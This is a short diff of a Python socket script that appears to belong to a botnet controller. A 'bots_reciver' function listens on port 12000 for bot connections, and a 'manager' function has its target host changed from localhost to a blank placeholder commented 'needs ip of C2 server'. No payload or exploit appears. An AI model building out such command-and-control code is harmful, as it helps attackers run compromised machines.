@@ -7,8 +7,8 @@ import json
 conn_list={}
 def bots_reciver():
     global conn_list
-    HOST = ''                 # Symbolic name meaning all available interfaces
-    PORT = 12000            # Arbitrary non-privileged port
+    HOST = ''                 # all available interfaces
+    PORT = 12000            # port
     global count
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -33,7 +33,7 @@ def bots_reciver():
 
 
 def manager(mac):
-    H = 'localhost'    # The remote host
+    H = ''    # needs ip of C2 server
     P = 5000               # The same port as used by the server
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as a:
         a.connect((H,P))
